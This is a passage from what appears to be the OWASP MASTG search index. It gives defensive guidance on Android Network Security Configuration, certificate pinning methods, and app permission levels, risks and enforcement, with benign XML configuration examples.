details.</p>","tags":["android","MASVS-CRYPTO","know"]},{"location":"MASTG/knowledge/android/MASVS-NETWORK/MASTG-KNOW-0014/","title":"MASTG-KNOW-0014: Android Network Security Configuration","text":"<p>Starting on Android 7.0 (API level 24), Android apps can customize their network security settings using the so-called Network Security Configuration feature which offers the following key capabilities:</p> <ul> <li>Cleartext traffic: Protect apps from accidental usage of cleartext traffic (or enables it).</li> <li>Custom trust anchors: Customize which Certificate Authorities (CAs) are trusted for an app's secure connections. For example, trusting particular self-signed certificates or restricting the set of public CAs that the app trusts.</li> <li>Certificate pinning: Restrict an app's secure connection to particular certificates.</li> <li>Debug-only overrides: Safely debug secure connections in an app without added risk to the installed base.</li> </ul> <p>If an app defines a custom Network Security Configuration, you can obtain its location by searching for <code>android:networkSecurityConfig</code> in the AndroidManifest.xml file.</p> <pre><code>&lt;application android:networkSecurityConfig=\"@xml/network_security_config\"\n</code></pre> <p>In this case the file is located at <code>@xml</code> (equivalent to /res/xml) and has the name \"network_security_config\" (which might vary). You should be able to find it as \"res/xml/network_security_config.xml\". If a configuration exists, the following event should be visible in the system logs ( Monitoring System Logs):</p> <pre><code>D/NetworkSecurityConfig: Using Network Security Config from resource network_security_config\n</code></pre> <p>The Network Security Configuration is XML-based and can be used to configure app-wide and domain-specific settings:</p> <ul> <li><code>base-config</code> applies to all connections that the app attempts to make.</li> <li><code>domain-config</code> overrides <code>base-config</code> for specific domains (it can contain multiple <code>domain</code> entries).</li> </ul> <p>For example, the following configuration uses the <code>base-config</code> to prevent cleartext traffic for all domains. But it overrides that rule using a <code>domain-config</code>, explicitly allowing cleartext traffic for <code>localhost</code>.</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;network-security-config&gt;\n    &lt;base-config cleartextTrafficPermitted=\"false\" /&gt;\n    &lt;domain-config cleartextTrafficPermitted=\"true\"&gt;\n        &lt;domain&gt;localhost&lt;/domain&gt;\n    &lt;/domain-config&gt;\n&lt;/network-security-config&gt;\n</code></pre> <p>Learn more:</p> <ul> <li>\"A Security Analyst's Guide to Network Security Configuration in Android P\"</li> <li>Android Developers - Network Security Configuration</li> <li>Android Codelab - Network Security Configuration</li> </ul>","tags":["android","MASVS-NETWORK","know"]},{"location":"MASTG/knowledge/android/MASVS-NETWORK/MASTG-KNOW-0014/#default-configurations","title":"Default Configurations","text":"<p>The default configuration for apps targeting Android 9 (API level 28) and higher is as follows:</p> <pre><code>&lt;base-config cleartextTrafficPermitted=\"false\"&gt;\n    &lt;trust-anchors&gt;\n        &lt;certificates src=\"system\" /&gt;\n    &lt;/trust-anchors&gt;\n&lt;/base-config&gt;\n</code></pre> <p>The default configuration for apps targeting Android 7.0 (API level 24) to Android 8.1 (API level 27) is as follows:</p> <pre><code>&lt;base-config cleartextTrafficPermitted=\"true\"&gt;\n    &lt;trust-anchors&gt;\n        &lt;certificates src=\"system\" /&gt;\n    &lt;/trust-anchors&gt;\n&lt;/base-config&gt;\n</code></pre> <p>The default configuration for apps targeting Android 6.0 (API level 23) and lower is as follows:</p> <pre><code>&lt;base-config cleartextTrafficPermitted=\"true\"&gt;\n    &lt;trust-anchors&gt;\n        &lt;certificates src=\"system\" /&gt;\n        &lt;certificates src=\"user\" /&gt;\n    &lt;/trust-anchors&gt;\n&lt;/base-config&gt;\n</code></pre>","tags":["android","MASVS-NETWORK","know"]},{"location":"MASTG/knowledge/android/MASVS-NETWORK/MASTG-KNOW-0015/","title":"MASTG-KNOW-0015: Certificate Pinning","text":"<p>Certificate pinning can be employed in Android apps to safeguard against Machine-in-the-Middle (MITM) attacks by ensuring that the app communicates exclusively with remote endpoints possessing specific identities.</p> <p>While effective when implemented correctly, insecure implementations potentially enable attackers to read and modify all communication. For more general details on pinning, refer to  Insecure Identity Pinning.</p> <p>Several approaches to certificate pinning exist, depending on the app's API level and the libraries used. Below, we highlight the most common methods. For a deeper dive into the specific implementations, see \"Deep Dive into Certificate Pinning on Android\".</p> <p>Important Considerations:</p> <p>Certificate pinning is a hardening practice, but it is not foolproof. There are multiple ways an attacker can bypass it, such as:</p> <ul> <li>Modifying the certificate validation logic in the app's <code>TrustManager</code>.</li> <li>Replacing pinned certificates stored in resource directories (<code>res/raw/</code>, <code>assets/</code>).</li> <li>Altering or removing pins in the Network Security Configuration.</li> </ul> <p>Any such modification invalidates the APK signature, requiring the attacker to repackage and re-sign the APK. To mitigate these risks, additional protections such as integrity checks, runtime verification, and obfuscation may be required. For more information on the specific techniques, see  Bypassing Certificate Pinning.</p>","tags":["android","MASVS-NETWORK","know"]},{"location":"MASTG/knowledge/android/MASVS-NETWORK/MASTG-KNOW-0015/#pinning-via-network-security-configuration-api-24","title":"Pinning via Network Security Configuration (API 24+)","text":"<p>The Network Security Configuration (NSC) is the preferred and recommended way to implement certificate pinning in Android, as it provides a declarative, maintainable, and secure approach without requiring code changes. It applies to all network traffic managed by the Android framework within the app, including <code>HttpsURLConnection</code>-based connections and <code>WebView</code> requests (unless a custom <code>TrustManager</code> is used). For communication from native code, NSC does not apply, and other mechanisms need to be considered.</p> <p>When attempting to establish a connection to a remote endpoint, the system will:</p> <ul> <li>Get and validate the incoming certificate.</li> <li>Extract the public key.</li> <li>Calculate a digest over the extracted public key.</li> <li>Compare the digest with the set of local pins.</li> </ul> <p>If at least one of the pinned digests matches, the certificate chain will be considered valid and the connection will proceed.</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;network-security-config&gt;\n    &lt;domain-config&gt;\n        &lt;!-- Use certificate pinning for OWASP website access including sub domains --&gt;\n        &lt;domain includeSubdomains=\"true\"&gt;owasp.org&lt;/domain&gt;\n        &lt;pin-set expiration=\"2028-12-31\"&gt;\n            &lt;!-- Hash of the public key (SubjectPublicKeyInfo of the X.509 certificate) of\n            the Intermediate CA of the OWASP website server certificate --&gt;\n            &lt;pin digest=\"SHA-256\"&gt;YLh1dUR9y6Kja30RrAn7JKnbQG/uEtLMkBgFF2Fuihg=&lt;/pin&gt;\n            &lt;!-- Hash of the public key (SubjectPublicKeyInfo of the X.509 certificate) of\n            the Root CA of the OWASP website server certificate --&gt;\n            &lt;pin digest=\"SHA-256\"&gt;Vjs8r4z+80wjNcr1YKepWQboSIRi63WsWXhIMN+eWys=&lt;/pin&gt;\n        &lt;/pin-set&gt;\n    &lt;/domain-config&gt;\n&lt;/network-security-config&gt;\n</code></pre> <p>Important Considerations:</p> <ul> <li>Backup Pins: Always include a backup pin to maintain connectivity if the primary certificate changes unexpectedly.</li> <li>Expiration Dates: Set an appropriate expiration date and ensure timely updates to prevent the app from bypassing pinning after the date has passed.</li> <li>Scope of Application: Be aware that this configuration applies only to connections made using <code>HttpsURLConnection</code> or libraries that rely on it. Other networking libraries or frameworks may require separate pinning implementations.</li> </ul>","tags":["android","MASVS-NETWORK","know"]},{"location":"MASTG/knowledge/android/MASVS-NETWORK/MASTG-KNOW-0015/#pinning-using-custom-trustmanagers","title":"Pinning using Custom TrustManagers","text":"<p>Before Network Security Configuration became available, the recommended way to implement certificate pinning was to create a custom <code>TrustManager</code> (using <code>javax.net.ssl</code> APIs) and override the default certificate validation. You can still use this approach on modern Android versions for flexibility or when you need more direct control.</p> <p>This approach involves:</p> <ol> <li>Loading the server's certificate(s) into a <code>KeyStore</code>.</li> <li>Creating a custom <code>TrustManager</code> that only trusts the certificate(s) in the <code>KeyStore</code>.</li> <li>Initializing an <code>SSLContext</code> with the custom <code>TrustManager</code>.</li> <li>Applying the custom <code>SSLContext</code> as the socket factory for the network connections (e.g., <code>HttpsURLConnection</code>).</li> </ol> <p>Important Note: This is a low-level approach and is prone to errors if not done carefully. Some key considerations include:</p> <ul> <li><code>SSLSocket</code> does not automatically verify hostnames, so you must handle this manually using a <code>HostnameVerifier</code> with a safe implementation (this includes explicitly checking the return value of <code>HostnameVerifier.verify()</code>). More information can be found in the Android documentation.</li> <li>Do not include a \"trust-all\" <code>TrustManager</code> that silently accepts all certificates. This opens the door for attackers to intercept and modify user data with minimal effort.</li> </ul>","tags":["android","MASVS-NETWORK","know"]},{"location":"MASTG/knowledge/android/MASVS-NETWORK/MASTG-KNOW-0015/#pinning-using-third-party-libraries","title":"Pinning using Third-party Libraries","text":"<p>Several third-party libraries offer built-in support for certificate pinning, simplifying the implementation process in some cases. These libraries typically utilize the custom <code>TrustManager</code> method, providing higher-level abstractions and additional features. Notable examples include:</p> <p>For example, OkHttp's offers pinning in its <code>CertificatePinner</code>. Under the hood, it uses a custom <code>TrustManager</code> to enforce pinning rules.</p>","tags":["android","MASVS-NETWORK","know"]},{"location":"MASTG/knowledge/android/MASVS-NETWORK/MASTG-KNOW-0015/#pinning-in-webviews","title":"Pinning in WebViews","text":"<p>For in-app <code>WebView</code> traffic on Android, the easiest approach is to rely on the Network Security Configuration. Since Android automatically applies NSC rules to WebView traffic within the same application, any pinning rules you set up in <code>network_security_config.xml</code> will also apply to resources loaded in that WebView.</p> <p>If you need additional customization beyond what NSC offers, you could implement pinning by intercepting requests at the WebView level (e.g., using <code>shouldInterceptRequest</code> and a custom <code>TrustManager</code>), but in most cases the built-in support is sufficient and simpler.</p>","tags":["android","MASVS-NETWORK","know"]},{"location":"MASTG/knowledge/android/MASVS-NETWORK/MASTG-KNOW-0015/#pinning-in-native-code","title":"Pinning in Native Code","text":"<p>It's also possible to implement pinning in native code (C/C++/Rust). By embedding or dynamically verifying certificates within compiled native libraries (<code>.so</code> files), you can increase the difficulty of bypassing or modifying the pinning checks via typical APK reverse engineering.</p> <p>That said, this approach requires significant security expertise and a careful design to manage certificates or public key hashes in native space. Maintenance and debugging also typically become more complex.</p>","tags":["android","MASVS-NETWORK","know"]},{"location":"MASTG/knowledge/android/MASVS-NETWORK/MASTG-KNOW-0015/#pinning-in-cross-platform-frameworks","title":"Pinning in Cross-Platform Frameworks","text":"<p>Cross-platform frameworks like Flutter, React Native, Cordova, and Xamarin often require special considerations for certificate pinning, as they may not use the same network stack as native apps. For example, Flutter relies on its own Dart <code>HttpClient</code> (with BoringSSL) instead of the platform's networking stack, while Cordova makes network requests through JavaScript in a WebView. As a result, pinning behavior varies\u2014some frameworks provide built-in configuration options, others rely on third-party plugins, and some offer no direct support but allow manual implementation via APIs. Understanding how a framework handles networking is crucial for ensuring proper pinning enforcement.</p>","tags":["android","MASVS-NETWORK","know"]},{"location":"MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0017/","title":"MASTG-KNOW-0017: App Permissions","text":"<p>Android assigns a distinct system identity (Linux user ID and group ID) to every installed app. Because each Android app operates in a process sandbox, apps must explicitly request access to resources and data that are outside their sandbox. They request this access by declaring the permissions they need to use system data and features. Depending on how sensitive or critical the data or feature is, the Android system will grant the permission automatically or ask the user to approve the request.</p> <p>To enhance user privacy and mitigate privacy risks, it is crucial for Android apps to minimize permission requests and only request access to sensitive information when absolutely necessary. The Android developer documentation offers valuable insights and best practices to help apps achieve the same level of functionality without requiring direct access to sensitive resources:</p> <ul> <li>Minimize your permission requests</li> <li>App permissions best practices</li> <li>Permissions and APIs that Access Sensitive Information</li> </ul> <p>Android permissions can be classified into distinct categories depending on the extent of restricted data access and permitted actions that they grant to an app. This classification includes the so-called \"Protection Level\" as shown on the permissions API reference page and AndroidManifest.xml Source Definitions.</p> <ul> <li>Install-time permissions: grant limited access to restricted data or let the app perform restricted actions that minimally affect the system or other apps. They are granted automatically at installation time (Android 6.0 (API level 23) or higher).<ul> <li>Protection Level: <code>normal</code>. Grants apps access to isolated application-level features with minimal risk to other apps, the user, and the system. Example: <code>android.permission.INTERNET</code></li> <li>Protection Level: <code>signature</code>. Granted only to apps signed with the same certificate as the one used to sign the declaring app. Example: <code>android.permission.ACCESS_MOCK_LOCATION</code></li> <li>Protection Level: <code>signatureOrSystem</code>. Reserved for system-embedded apps or those signed with the same certificate as the one used to sign the declaring app. Example: <code>android.permission.ACCESS_DOWNLOAD_MANAGER</code>. Old synonym for <code>signature|privileged</code>. Deprecated in API level 23.</li> </ul> </li> <li>Runtime permissions: require prompting the user at runtime for explicit approval.<ul> <li>Protection Level: <code>dangerous</code>. Grant additional access to restricted data or let the app perform restricted actions that more substantially affect the system and other apps.</li> </ul> </li> <li>Special permissions: require the user to navigate to Settings &gt; Apps &gt; Special app access and give explicit consent.<ul> <li>Protection Level: <code>appop</code>. Grant access to system resources that are particularly sensitive such as displaying and drawing over other apps or accessing all storage data.</li> </ul> </li> <li>Custom permissions in order to share their own resources and capabilities with other apps.<ul> <li>Protection Level: <code>normal</code>, <code>signature</code> or <code>dangerous</code>.</li> </ul> </li> </ul> <p>Independently from the assigned Protection Level, it is important to consider the risk that a permission might be posing considering the additional guarded capabilities, this is especially important for preloaded apps. The following table presents a representative set of Android permissions categorized by associated risk as defined in this paper which leverages the set of (privileged) permissions and entrance points to an app to estimate its attack surface.</p> Risk Category Permissions Protection Level ASTRONOMICAL <code>android.permission.INSTALL_PACKAGES</code> signature CRITICAL <code>android.permission.COPY_PROTECTED_DATA</code> signature CRITICAL <code>android.permission.WRITE_SECURE_SETTINGS</code> signature CRITICAL <code>android.permission.READ_FRAME_BUFFER</code> signature CRITICAL <code>android.permission.MANAGE_CA_CERTIFICATES</code> signature CRITICAL <code>android.permission.MANAGE_APP_OPS_MODES</code> signature CRITICAL <code>android.permission.GRANT_RUNTIME_PERMISSIONS</code> signature CRITICAL <code>android.permission.DUMP</code> signature CRITICAL <code>android.permission.CAMERA</code> dangerous CRITICAL <code>android.permission.SYSTEM_CAMERA</code> signatureOrSystem CRITICAL <code>android.permission.MANAGE_PROFILE_AND_DEVICE_OWNERS</code> signature CRITICAL <code>android.permission.MOUNT_UNMOUNT_FILESYSTEMS</code> signature CRITICAL <code>android.permission.PROVIDE_DEFAULT_ENABLED_CREDENTIAL_SERVICE</code> signature CRITICAL <code>android.permission.PROVIDE_REMOTE_CREDENTIALS</code> signature CRITICAL <code>android.permission.THREAD_NETWORK_PRIVILEGED</code> signature CRITICAL <code>android.permission.RECORD_SENSITIVE_CONTENT</code> signature CRITICAL <code>android.permission.RECEIVE_SENSITIVE_NOTIFICATIONS</code> signature HIGH <code>android.permission.INSTALL_GRANT_RUNTIME_PERMISSIONS</code> signature HIGH <code>android.permission.READ_SMS</code> dangerous HIGH <code>android.permission.WRITE_SMS</code> normal HIGH <code>android.permission.RECEIVE_MMS</code> dangerous HIGH <code>android.permission.SEND_SMS_NO_CONFIRMATION</code> signature HIGH <code>android.permission.RECEIVE_SMS</code> dangerous HIGH <code>android.permission.READ_LOGS</code> signature HIGH <code>android.permission.READ_PRIVILEGED_PHONE_STATE</code> signature HIGH <code>android.permission.LOCATION_HARDWARE</code> signature HIGH <code>android.permission.ACCESS_FINE_LOCATION</code> dangerous HIGH <code>android.permission.ACCESS_BACKGROUND_LOCATION</code> dangerous HIGH <code>android.permission.BIND_ACCESSIBILITY_SERVICE</code> signature HIGH <code>android.permission.ACCESS_WIFI_STATE</code> normal HIGH <code>com.android.voicemail.permission.READ_VOICEMAIL</code> signature HIGH <code>android.permission.RECORD_AUDIO</code> dangerous HIGH <code>android.permission.CAPTURE_AUDIO_OUTPUT</code> signature HIGH <code>android.permission.ACCESS_NOTIFICATIONS</code> signature HIGH <code>android.permission.INTERACT_ACROSS_USERS_FULL</code> signature HIGH <code>android.permission.BLUETOOTH_PRIVILEGED</code> signature HIGH <code>android.permission.GET_PASSWORD</code> signature HIGH <code>android.permission.INTERNAL_SYSTEM_WINDOW</code> signature HIGH <code>android.permission.MANAGE_ONGOING_CALLS</code> signature HIGH <code>android.permission.READ_RESTRICTED_STATS</code> internal HIGH <code>android.permission.BIND_AUTOFILL_SERVICE</code> signature HIGH <code>android.permission.WRITE_VERIFICATION_STATE_E2EE_CONTACT_KEYS</code> signature HIGH <code>android.permission.READ_DROPBOX_DATA</code> signature HIGH <code>android.permission.WRITE_FLAGS</code> signature MEDIUM <code>android.permission.ACCESS_COARSE_LOCATION</code> dangerous MEDIUM <code>android.permission.CHANGE_COMPONENT_ENABLED_STATE</code> signature MEDIUM <code>android.permission.READ_CONTACTS</code> dangerous MEDIUM <code>android.permission.WRITE_CONTACTS</code> dangerous MEDIUM <code>android.permission.CONNECTIVITY_INTERNAL</code> signature MEDIUM <code>android.permission.ACCESS_MEDIA_LOCATION</code> dangerous MEDIUM <code>android.permission.READ_EXTERNAL_STORAGE</code> dangerous MEDIUM <code>android.permission.WRITE_EXTERNAL_STORAGE</code> dangerous MEDIUM <code>android.permission.SYSTEM_ALERT_WINDOW</code> signature MEDIUM <code>android.permission.READ_CALL_LOG</code> dangerous MEDIUM <code>android.permission.WRITE_CALL_LOG</code> dangerous MEDIUM <code>android.permission.INTERACT_ACROSS_USERS</code> signature MEDIUM <code>android.permission.MANAGE_USERS</code> signature MEDIUM <code>android.permission.READ_CALENDAR</code> dangerous MEDIUM <code>android.permission.BLUETOOTH_ADMIN</code> normal MEDIUM <code>android.permission.BODY_SENSORS</code> dangerous MEDIUM <code>android.permission.MANAGE_EXTERNAL_STORAGE</code> signature MEDIUM <code>android.permission.ACCESS_BLOBS_ACROSS_USERS</code> signature MEDIUM <code>android.permission.BLUETOOTH_ADVERTISE</code> dangerous MEDIUM <code>android.permission.READ_MEDIA_AUDIO</code> dangerous MEDIUM <code>android.permission.READ_MEDIA_IMAGES</code> dangerous MEDIUM <code>android.permission.READ_MEDIA_VIDEO</code> dangerous MEDIUM <code>android.permission.REGISTER_NSD_OFFLOAD_ENGINE</code> signature MEDIUM <code>android.permission.ACCESS_LAST_KNOWN_CELL_ID</code> signature MEDIUM <code>android.permission.USE_COMPANION_TRANSPORTS</code> signature LOW <code>android.permission.DOWNLOAD_WITHOUT_NOTIFICATION</code> normal LOW <code>android.permission.PACKAGE_USAGE_STATS</code> signature LOW <code>android.permission.MASTER_CLEAR</code> signature LOW <code>android.permission.DELETE_PACKAGES</code> normal LOW <code>android.permission.GET_PACKAGE_SIZE</code> normal LOW <code>android.permission.BLUETOOTH</code> normal LOW <code>android.permission.DEVICE_POWER</code> signature LOW <code>android.permission.READ_PRECISE_PHONE_STATE</code> signature LOW <code>android.permission.LOG_FOREGROUND_RESOURCE_USE</code> signature LOW <code>android.permission.MANAGE_DEFAULT_APPLICATIONS</code> signature LOW <code>android.permission.MANAGE_FACE</code> signature LOW <code>android.permission.REPORT_USAGE_STATS</code> signature LOW <code>android.permission.MANAGE_DISPLAYS</code> signature LOW <code>android.permission.RESTRICT_DISPLAY_MODES</code> signature LOW <code>android.permission.ACCESS_HIDDEN_PROFILES_FULL</code> signature LOW <code>android.permission.GET_BACKGROUND_INSTALLED_PACKAGES</code> signature NONE <code>android.permission.ACCESS_NETWORK_STATE</code> normal NONE <code>android.permission.RECEIVE_BOOT_COMPLETED</code> normal NONE <code>android.permission.WAKE_LOCK</code> normal NONE <code>android.permission.FLASHLIGHT</code> normal NONE <code>android.permission.VIBRATE</code> normal NONE <code>android.permission.WRITE_MEDIA_STORAGE</code> signature NONE <code>android.permission.MODIFY_AUDIO_SETTINGS</code> normal <p>Note that this categorization can change over time. The paper gives us an example of that:</p> <p>Prior to Android 10, the <code>READ_PHONE_STATE</code> permission would be classified as HIGH, due to the permanent device identifiers (e.g. (IMEI/MEID, IMSI, SIM, and build serial) that it guards. However, starting from Android 10, a bulk of the sensitive information that can be used for tracking has been moved, refactored or rescoped into a new permission called <code>READ_PRIVILEGED_PHONE_STATE</code>, putting the new permission in the HIGH category, but resulting in the <code>READ_PHONE_STATE</code> permission moving to LOW.</p>","tags":["android","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0017/#permission-changes-per-api-level","title":"Permission Changes per API Level","text":"<p>Android 8.0 (API level 26) Changes:</p> <p>The following changes affect all apps running on Android 8.0 (API level 26), even to those apps targeting lower API levels.</p> <ul> <li>Contacts provider usage stats change: when an app requests the <code>READ_CONTACTS</code> permission, queries for contact's usage data will return approximations rather than exact values (the auto-complete API is not affected by this change).</li> </ul> <p>Apps targeting Android 8.0 (API level 26) or higher are affected by the following:</p> <ul> <li>Account access and discoverability improvements: Apps can no longer get access to user accounts only by having the <code>GET_ACCOUNTS</code> permission granted, unless the authenticator owns the accounts or the user grants that access.</li> <li>New telephony permissions: the following permissions (classified as dangerous) are now part of the <code>PHONE</code> permissions group:<ul> <li>The <code>ANSWER_PHONE_CALLS</code> permission allows to answer incoming phone calls programmatically (via <code>acceptRingingCall</code>).</li> <li>The <code>READ_PHONE_NUMBERS</code> permission grants read access to the phone numbers stored in the device.</li> </ul> </li> <li> <p>Restrictions when granting dangerous permissions: Dangerous permissions are classified into permission groups (e.g. the <code>STORAGE</code> group contains <code>READ_EXTERNAL_STORAGE</code> and <code>WRITE_EXTERNAL_STORAGE</code>). Before Android 8.0 (API level 26), it was sufficient to request one permission of the group in order to get all permissions of that group also granted at the same time. This has changed starting at Android 8.0 (API level 26): whenever an app requests a permission at runtime, the system will grant exclusively that specific permission. However, note that all subsequent requests for permissions in that permission group will be automatically granted without showing the permissions dialog to the user. See this example from the Android developer documentation:</p> <p>Suppose an app lists both READ_EXTERNAL_STORAGE and WRITE_EXTERNAL_STORAGE in its manifest. The app requests READ_EXTERNAL_STORAGE and the user grants it. If the app targets API level 25 or lower, the system also grants WRITE_EXTERNAL_STORAGE at the same time, because it belongs to the same STORAGE permission group and is also registered in the manifest. If the app targets Android 8.0 (API level 26), the system grants only READ_EXTERNAL_STORAGE at that time; however, if the app later requests WRITE_EXTERNAL_STORAGE, the system immediately grants that privilege without prompting the user.</p> <p>You can see the list of permission groups in the Android developer documentation. To make this a bit more confusing, Google also warns that particular permissions might be moved from one group to another in future versions of the Android SDK and therefore, the logic of the app shouldn't rely on the structure of these permission groups. The best practice is to explicitly request every permission whenever it's needed.</p> </li> </ul> <p>Android 9 (API Level 28) Changes:</p> <p>The following changes affect all apps running on Android 9, even to those apps targeting API levels lower than 28.</p> <ul> <li>Restricted access to call logs: <code>READ_CALL_LOG</code>, <code>WRITE_CALL_LOG</code>, and <code>PROCESS_OUTGOING_CALLS</code> (dangerous) permissions are moved from <code>PHONE</code> to the new <code>CALL_LOG</code> permission group. This means that being able to make phone calls (e.g. by having the permissions of the <code>PHONE</code> group granted) is not sufficient to get access to the call logs.</li> <li>Restricted access to phone numbers: apps wanting to read the phone number require the <code>READ_CALL_LOG</code> permission when running on Android 9 (API level 28).</li> <li>Restricted access to Wi-Fi location and connection information: SSID and BSSID values cannot be retrieved (e.g. via <code>WifiManager.getConnectionInfo</code> unless all of the following is true:<ul> <li>The <code>ACCESS_FINE_LOCATION</code> or <code>ACCESS_COARSE_LOCATION</code> permission.</li> <li>The <code>ACCESS_WIFI_STATE</code> permission.</li> <li>Location services are enabled (under Settings -&gt; Location).</li> </ul> </li> </ul> <p>Apps targeting Android 9 (API level 28) or higher are affected by the following:</p> <ul> <li>Build serial number deprecation: device's hardware serial number cannot be read (e.g. via <code>Build.getSerial</code>) unless the <code>READ_PHONE_STATE</code> (dangerous) permission is granted.</li> </ul> <p>Android 10 (API level 29) Changes:</p> <p>Android 10 (API level 29) introduces several user privacy enhancements. The changes regarding permissions affect to all apps running on Android 10 (API level 29), including those targeting lower API levels.</p> <ul> <li>Restricted Location access: new permission option for location access \"only while using the app\".</li> <li>Scoped storage by default: apps targeting Android 10 (API level 29) don't need to declare any storage permission to access their files in the app specific directory in external storage as well as for files creates from the media store.</li> <li>Restricted access to screen contents: <code>READ_FRAME_BUFFER</code>, <code>CAPTURE_VIDEO_OUTPUT</code>, and <code>CAPTURE_SECURE_VIDEO_OUTPUT</code> permissions are now signature-access only, which prevents silent access to the device's screen contents.</li> <li>User-facing permission check on legacy apps: when running an app targeting Android 5.1 (API level 22) or lower for the first time, users will be prompted with a permissions screen where they can revoke access to specific legacy permissions (which previously would be automatically granted at installation time).</li> </ul>","tags":["android","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0017/#permission-enforcement","title":"Permission Enforcement","text":"<p>Activity Permission Enforcement:</p> <p>Permissions are applied via <code>android:permission</code> attribute within the <code>&lt;activity&gt;</code> tag in the manifest. These permissions restrict which applications can start that Activity. The permission is checked during <code>Context.startActivity</code> and <code>Activity.startActivityForResult</code>. Not holding the required permission results in a <code>SecurityException</code> being thrown from the call.</p> <p>Service Permission Enforcement:</p> <p>Permissions applied via <code>android:permission</code> attribute within the <code>&lt;service&gt;</code> tag in the manifest restrict who can start or bind to the associated Service. The permission is checked during <code>Context.startService</code>, <code>Context.stopService</code> and <code>Context.bindService</code>. Not holding the required permission results in a <code>SecurityException</code> being thrown from the call.</p> <p>Broadcast Permission Enforcement:</p> <p>Permissions applied via <code>android:permission</code> attribute within the <code>&lt;receiver&gt;</code> tag restrict access to send broadcasts to the associated <code>BroadcastReceiver</code>. The held permissions are checked after <code>Context.sendBroadcast</code> returns, while trying to deliver the sent broadcast to the given receiver. Not holding the required permissions doesn't throw an exception, the result is an unsent broadcast.</p> <p>A permission can be supplied to <code>Context.registerReceiver</code> to control who can broadcast to a programmatically registered receiver. Going the other way, a permission can be supplied when calling <code>Context.sendBroadcast</code> to restrict which broadcast receivers are allowed to receive the broadcast.</p> <p>Note that both a receiver and a broadcaster can require a permission. When this happens, both permission checks must pass for the intent to be delivered to the associated target. For more information, please reference the section \"Restricting broadcasts with permissions\" in the Android Developers Documentation.</p> <p>Content Provider Permission Enforcement:</p> <p>Permissions applied via <code>android:permission</code> attribute within the <code>&lt;provider&gt;</code> tag restrict access to data in a ContentProvider. Content providers have an important additional security facility called URI permissions which is described next. Unlike the other components, ContentProviders have two separate permission attributes that can be set, <code>android:readPermission</code> restricts who can read from the provider, and <code>android:writePermission</code> restricts who can write to it. If a ContentProvider is protected with both read and write permissions, holding only the write permission does not also grant read permissions.</p> <p>Permissions are checked when you first retrieve a provider and as operations are performed using the ContentProvider. Using <code>ContentResolver.query</code> requires holding the read permission; using <code>ContentResolver.insert</code>, <code>ContentResolver.update</code>, <code>ContentResolver.delete</code> requires the write permission. A <code>SecurityException</code> will be thrown from the call if proper permissions are not held in all these cases.</p> <p>Content Provider URI Permissions:</p> <p>The standard permission system is not sufficient when being used with content providers. For example a content provider may want to limit permissions to READ permissions in order to protect itself, while using custom URIs to retrieve information. An application should only have the permission for that specific URI.</p> <p>The solution is per-URI permissions. When starting or returning a result from an activity, the method can set <code>Intent.FLAG_GRANT_READ_URI_PERMISSION</code> and/or <code>Intent.FLAG_GRANT_WRITE_URI_PERMISSION</code>. This grants permission to the activity for the specific URI regardless if it has permissions to access to data from the content provider.</p> <p>This allows a common capability-style model where user interaction drives ad-hoc granting of fine-grained permission. This can be a key facility for reducing the permissions needed by apps to only those directly related to their behavior. Without this model in place malicious users may access other member's email attachments or harvest contact lists for future use via unprotected URIs. In the manifest the <code>android:grantUriPermissions</code> attribute or the node help restrict the URIs.</p> <p>Here you can find more information about APIs related to URI Permissions:</p> <ul> <li>grantUriPermission</li> <li>revokeUriPermission</li> <li>checkUriPermission</li> </ul>","tags":["android","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0017/#custom-permissions","title":"Custom Permissions","text":"<p>Android allows apps to expose their services/components to other apps. Custom permissions are required for app access to the exposed components. You can define custom permissions in <code>AndroidManifest.xml</code> by creating a permission tag with two mandatory attributes: <code>android:name</code> and <code>android:protectionLevel</code>.</p> <p>It is crucial to create custom permissions that adhere to the Principle of Least Privilege: permission should be defined explicitly for its purpose, with a meaningful and accurate label and description.</p> <p>Below is an example of a custom permission called <code>START_MAIN_ACTIVITY</code>, which is required when launching the <code>TEST_ACTIVITY</code> Activity.</p> <p>The first code block defines the new permission, which is self-explanatory. The label tag is a summary of the permission, and the description is a more detailed version of the summary. You can set the protection level according to the types of permissions that will be granted. Once you've defined your permission, you can enforce it by adding it to the application's manifest. In our example, the second block represents the component that we are going to restrict with the permission we created. It can be enforced by adding the <code>android:permission</code> attributes.</p> <pre><code>&lt;permission android:name=\"com.example.myapp.permission.START_MAIN_ACTIVITY\"\n        android:label=\"Start Activity in myapp\"\n        android:description=\"Allow the app to launch the activity of myapp app, any app you grant this permission will be able to launch main activity by myapp app.\"\n        android:protectionLevel=\"normal\" /&gt;\n\n&lt;activity android:name=\"TEST_ACTIVITY\"\n    android:permission=\"com.example.myapp.permission.START_MAIN_ACTIVITY\"&gt;\n    &lt;intent-filter&gt;\n        &lt;action android:name=\"android.intent.action.MAIN\" /&gt;\n        &lt;category android:name=\"android.intent.category.LAUNCHER\" /&gt;\n     &lt;/intent-filter&gt;\n&lt;/activity&gt;\n</code></pre> <p>Once the permission <code>START_MAIN_ACTIVITY</code> has been created, apps can request it via the <code>uses-permission</code> tag in the <code>AndroidManifest.xml</code> file. Any application granted the custom permission <code>START_MAIN_ACTIVITY</code> can then launch the <code>TEST_ACTIVITY</code>. Please note <code>&lt;uses-permission android:name=\"myapp.permission.START_MAIN_ACTIVITY\" /&gt;</code> must be declared before the <code>&lt;application&gt;</code> or an exception will occur at runtime. Please see the example below that is based on the permission overview and manifest-intro.</p> <pre><code>&lt;manifest&gt;\n&lt;uses-permission android:name=\"com.example.myapp.permission.START_MAIN_ACTIVITY\" /&gt;\n        &lt;application&gt;\n            &lt;activity&gt;\n            &lt;/activity&gt;\n        &lt;/application&gt;\n&lt;/manifest&gt;\n</code></pre> <p>We recommend using a reverse-domain annotation when registering a permission, as in the example above (e.g. <code>com.domain.application.permission</code>) in order to avoid collisions with other applications.</p>","tags":["android","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0018/","title":"MASTG-KNOW-0018: 